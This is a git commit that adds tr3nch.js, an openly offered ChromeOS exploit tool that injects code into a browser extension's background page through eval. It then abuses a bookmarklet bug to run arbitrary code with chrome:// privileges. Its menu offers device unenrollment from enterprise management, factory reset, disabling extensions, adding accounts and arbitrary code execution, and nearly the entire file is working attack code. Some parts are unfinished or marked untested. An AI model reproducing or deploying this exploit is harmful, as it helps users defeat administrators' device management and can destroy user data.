f0b1f4b3728422d647f0440bfe41919f0420877b
Zeglol1234 <115665023+ZeglolTheThirtySixth@users.noreply.github.com>
2024-03-29 08:46:25 -0400

    Add files via upload

---
+++ tr3nch.js
@@ -0,0 +1,244 @@
+chrome.runtime.getBackgroundPage((background) => {
+	function payload() {
+		console.log('Tr3nch injected into current extension.');
+		chrome.runtime.onMessage.addListener(function(message) {
+			switch(message.cmd) {
+				case "runCode":
+					/* Since we're the background page, we'll want to be able to run code from the menu, and
+					it just so happens Sh0vel requires eval, soooooo...*/
+					eval(message.code);
+					break;
+				default:
+					console.log(`Unrecognized Message: ${message.cmd}`);
+					break;
+			}
+		});
+		chrome.browserAction.onClicked.addListener(function() {
+			function tabPayload() {
+				/* asPage is what really ties everything together, with bookmarklets having a bug that
+				lets us run code outside of the content script's boundaries. This has been dubbed
+				"sh0vel", and we can use it to not only access private chrome APIs, but also Mojo and WEBUI.*/
+				const asPage=function(code) {
+					let link=window.open('about:blank','_blank');
+					link.location.href=`javascript:(function() {chrome=opener.chrome;${code}})();`;
+					/* We don't call link.close here as some callbacks need to run before closing, so
+					ALL asPage calls need to have window.close be the last thing that runs unless you need the extra tab*/
+				}
+				/* For convenience, we'll want to run code as the extension too, as it may also
+				have useful permissions that can be exploited.*/
+				const asExt=function(code) {
+					chrome.runtime.sendMessage(chrome.runtime.id, {cmd: "runCode", code: code});
+				}
+
+				/* Here we load in the base GUI, the options will be filled in later by loadMenuItems. */
+				const loadMenuHTML=function() {
+					
+				}
+
+				/* Check what the full extent of our permissions are based off the origin. */
+				const checkPerms=function() {
+					/* We use window.origin so url parameters can't break the menu */
+					if (!window.origin.includes("chrome:")) {
+						return null;
+					}
+
+					switch(window.origin.replace("chrome://","")) {
+						case "oobe":
+							return [
+								"unenroll",
+								"update",
+								"webViewProxy",
+								"reboot"
+							];
+							break;
+						case "extensions":
+							return ["killExtensions"];
+							break;
+						case "os-settings":
+							return [
+								"manageNetworks",
+								"addAccounts",
+								"siteSettings",
+								"update",
+								"restart",
+								"disableExtensions"
+							];
+							break;
+						case "settings":
+							return [
+								"addAccounts",
+								"siteSettings",
+								"update",
+								"restart",
+								"disableExtensions"
+							];
+							break;
+						case "chrome-signin":
+							return ["webViewProxy"];
+							break;
+						case "network":
+							return ["manageNetworks"];
+							break;
+						default:
+							/* If a page isn't here, its permissions are not considered useful. */
+							return null;
+							break;
+					}
+				}
+
+				/* Get available permissions and make a container filled with menu options, then return it. */
+				const loadMenuItems=function() {
+					let perms=checkPerms();
+					let container=document.createElement('div');
+
+					/*=================================================================
+					Permission Independent Options
+					Put options that don't need specific page permissions here
+					=================================================================*/
+					
+					let extEvalBox=document.createElement('div');
+					/* We can use innerHTML because we inherit the CSP from our extension */
+					extEvalBox.innerHTML='<br><h1>Run Code As Background Page</h1><textarea id="extEvalBox"></textarea><button id="extEvalButton">Run as Background</button>';
+					extEvalBox.querySelector('#extEvalButton').addEventListener('click', async () => {
+						asExt(document.querySelector('#extEvalBox').value);
+					});
+					container.append(extEvalBox);
+
+					let pageEvalBox=document.createElement('div');
+					pageEvalBox.innerHTML='<br><h1>Run Code On This Page</h1><textarea id="pageEvalBox"></textarea><button id="pageEvalButton">Run as Page</button>';
+					pageEvalBox.querySelector('#pageEvalButton').addEventListener('click', async () => {
+						asPage(document.querySelector('#pageEvalBox').value);
+					});
+					container.append(pageEvalBox);
+
+					/* =================================================================
+					Permission Dependent Options
+					Put options that DO need specific page permissions here
+					=================================================================*/
+
+					if (perms == null) {
+						asExt('alert("The page you\'re attempting to run Tr3nch on is not priveledged. Please run this on a url starting with \'chrome://\'.");');
+						return container; /* For unpriveledged pages extension permissions are still accessible, so stop only after loading them in. */
+					}
+					
+					if (perms.includes("update")) {
+						let updateBox=document.createElement('div');
+						updateBox.innerHTML='<br><h1>Attempt OS Update</h1><button id="update">Update System</button>';
+						updateBox.querySelector('#update').addEventListener('click', () => {
+							asPage("chrome.send('requestUpdate');window.close();");
+						});
+						container.append(updateBox);
+					}
+					if (perms.includes("restart")) {
+						let restartBox=document.createElement('div');
+						restartBox.innerHTML='<br><h1>User Session Management</h1>';
+
+						let restart=document.createElement('button');
+						restart.innerText="Restart Chrome";
+						restart.addEventListener('click', () => {
+							asPage("chrome.send('restart');window.close();");
+						});
+						restartBox.append(restart);
+
+						let signOut=document.createElement('button');
+						signOut.innerText="Sign Out";
+						signOut.addEventListener('click', () => {
+							asPage("chrome.send('signOutAndRestart');window.close();");
+						});
+						restartBox.append(signOut);
+
+						let powerwash=document.createElement('button');
+						powerwash.innerText="Powerwash";
+						powerwash.addEventListener('click', () => {
+							if (confirm("Note: THIS WILL DELETE ALL USERDATA! ARE YOU SURE?!")) {
+								asPage("chrome.send('factoryReset', ['false']);window.close();");
+							}
+						});
+						restartBox.append(powerwash);
+
+						container.append(restartBox);
+					}
+					if (perms.includes("addAccounts")) {
+						let accBox=document.createElement('div');
+						accBox.innerHTML='<br><h1>Manage Accounts</h1>';
+
+						let addAccButton=document.createElement('button');
+						addAccButton.innerText="Add User Account";
+						addAccButton.addEventListener('click', () => {
+							asPage("chrome.send('TurnOffSync');window.close();");
+							/* window.open has a few problems, lets use tabs.create instead. */
+							asExt("chrome.tabs.create({url: 'https://tinyurl.com/addSession'});");
+						});
+						accBox.append(addAccButton);
+
+						container.append(accBox);
+					}
+					if (perms.includes("webViewProxy")) {
+						let proxyBox=document.createElement('div');
+						proxyBox.innerHTML='<br><h1>Webview Proxy Spawner</h1><label><input id="proxyUrlBox"></label><button id="urlProxyButton">Launch Webview</button>';
+						proxyBox.querySelector('#proxyUrlButton').addEventListener('click', () => {
+							let proxy=window.open(window.origin, '_blank');
+							/* We can't use innerHTML cross-page because our extension's CSP only applies to this page. */
+							let webview=document.createElement('webview');
+							webview.src=document.querySelector('#proxyUrlBox').value; /* I'm still trying to figure out how webviews work lmao */
+							proxy.document.body.innerText="";
+							proxy.document.body.append(webview);
+						});
+
+						container.append(proxyBox);
+					}
+					if (perms.includes("unenroll")) {
+						let enrollBox=document.createElement('div');
+						enrollBox.innerHTML="<br><h1>Unenrollment</h1>";
+
+						let unenroll=document.createElement('button');
+						unenroll.innerText="Unenroll";
+						unenroll.addEventListener('click', () => {
+							asPage("chrome.send('OauthEnrollClose');"); /* Untested */
+						});
+						enrollBox.append(unenroll);
+
+						container.append(enrollBox);
+					}
+
+					return container;
+				}
+
+				loadMenuHTML(); /* Load in the base menu */
+				let mainContainer=document.querySelector('#opt-container');
+
+				if (mainContainer == null) {
+					asExt("alert('loadMenuHTML has not been implemented yet.');");
+					return;
+				}
+				mainContainer.innerHTML=loadMenuItems(); /* Create a container for all options and append them */
+			} /* As Page */
+
+			console.log("Injecting Tr3nch into current page");
+			
+			/* I would LOVE to use MV3's function injection capabilities, but because Sh0vel relies entirely on MV2,
+			we can't do that, so let's do it my way. */
+			chrome.tabs.executeScript(null, {code: `${tabPayload.toString()};tabPayload();`});
+			/* If you're wondering why I reiterated tabPayload() at the end, it's because the 
+			.toString() method in this case only defines the function in the page, it still needs to be called manually. */
+		}); /* On Clicked */
+	} /* As Background Page */
+
+	let manifest=chrome.runtime.getManifest();
+	if (!manifest.browser_action) {
+		alert("Current extension does not have browserAction permissions, cannot continue.");
+		return;
+	}
+	/* The quotations prevent it from accepting 'wasm-unsafe-eval' which won't work */
+	if (!manifest.content_security_policy.includes("'unsafe-eval'")) { 
+		alert("Current extension does not have permission to use eval, cannot continue.");
+		return;
+	}
+	/* Cool perk of sh0vel: The extension requires eval to work, so we can run code directly
+	as the background page to get persistence until the extension restarts */
+	if (background.location.href !== location.href) {
+		background.eval(`${payload.toString()};payload();`);
+	}else{
+		payload(); /* If this is already running as the background page then we don't need to use eval. */
+	}
+});
